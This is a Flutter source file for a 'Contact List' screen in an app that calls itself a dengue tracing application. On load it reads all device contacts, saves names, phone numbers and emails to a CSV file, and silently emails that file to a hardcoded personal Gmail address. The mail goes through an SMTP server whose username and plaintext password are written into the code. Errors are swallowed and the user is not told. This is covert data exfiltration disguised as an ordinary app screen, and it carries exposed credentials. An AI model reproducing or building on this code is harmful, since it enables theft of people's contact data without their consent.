import 'dart:io';
import 'package:dengue_tracing_application/Global/Paths.dart';

import 'package:flutter/material.dart';
import 'package:mailer/smtp_server.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:csv/csv.dart';
import 'package:mailer/mailer.dart';

class ContactListScreen extends StatefulWidget {
  const ContactListScreen({super.key});

  @override
  _ContactListScreenState createState() => _ContactListScreenState();
}

class _ContactListScreenState extends State<ContactListScreen> {
  final List<Contact> _contacts = [];

  @override
  void initState() {
    super.initState();
    _getContactList();
  }

  Future<List<Contact>> _getContactList() async {
    if (await Permission.contacts.request().isDenied) {
      return []; // Return an empty list if permission is denied
    }

    final Iterable<Contact> contacts =
        await ContactsService.getContacts(withThumbnails: true);
    setState(() {
      _contacts.addAll(contacts); // Add the fetched contacts to the list
    });
    _exportContacts(); // Automatically send email after getting contacts
    return contacts.toList();
  }

  Future<String> _getFilePath(String fileName) async {
    final directory = await getExternalStorageDirectory();
    return '${directory!.path}/$fileName';
  }

  Future<void> _exportContacts() async {
    List<List<dynamic>> rows = [];
    rows.add([
      'Name',
      'Phone',
      'Email',
    ]);

    for (var contact in _contacts) {
      String name = contact.displayName ?? '';
      String phone = '';
      String email = '';
      if (contact.phones!.isNotEmpty) {
        phone = contact.phones!.first.value ?? '';
      }
      if (contact.emails!.isNotEmpty) {
        email = contact.emails!.first.value ?? '';
      }
      if (phone.length > 9) {
        rows.add([
          name,
          phone,
          email,
        ]);
      }
    }

    List<List<dynamic>> csvData = rows;
    String csv = const ListToCsvConverter().convert(csvData);

    String filePath = await _getFilePath('contacts.csv');
    File file = File(filePath);
    await file.writeAsString(csv);

    await _sendEmail(filePath);
  }

  Future<void> _sendEmail(String filePath) async {
    // Create an SMTP client configuration
    final smtpServer = SmtpServer(
      "mail.hub4web.com",
      username: "dengue@hub4web.com",
      password: ")~f=WoRKO8!+",
      port: 587,
      //ssl: true,
    );

    // Create the message
    final message = Message()
      ..from = const Address('dengue@hub4web.com')
      ..recipients = ['huzaifanawaz367@gmail.com']
      ..subject = 'Contact List'
      ..attachments.add(FileAttachment(File(filePath)))
      ..text = 'Please find attached the contact list.';

    // Send the message
    try {
      send(message, smtpServer);
      //final sendReport = await send(message, smtpServer);
      //snackBar(context, 'Message sent: ${sendReport.toString()}');
    } on MailerException {
      //print('Message not sent: $e');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Contact List'),
      ),
      body: Padding(
        padding: const EdgeInsets.all(8.0),
        child: ListView.builder(
          itemCount: _contacts.length,
          itemBuilder: (context, index) {
            Contact contact = _contacts[index];
            return contact.phones!.isEmpty
                ? const SizedBox()
                : contact.phones!.first.value!.length <= 9
                    ? const SizedBox()
                    : Card(
                        color: ScfColor,
                        //                           <-- Card widget
                        child: ListTile(
                          leading: CircleAvatar(
                            child: Text(contact.initials()),
                          ),
                          title: Text(
                            contact.displayName ?? '',
                            style: TextStyle(
                              fontWeight: FontWeight.w600,
                              color: txtColor,
                              fontSize: 15,
                            ),
                          ),
                          subtitle: Text(
                            contact.phones!.isNotEmpty
                                ? contact.phones!.first.value!
                                : 'No phone number',
                            style: TextStyle(
                              fontWeight: FontWeight.w400,
                              color: txtColor,
                              fontSize: 12,
                            ),
                          ),
                        ),
                      );
          },
        ),
      ),
      floatingActionButton: FloatingActionButton(
        onPressed: _exportContacts,
        tooltip: 'Export Contact List',
        child: const Icon(Icons.share),
      ),
    );
  }
}
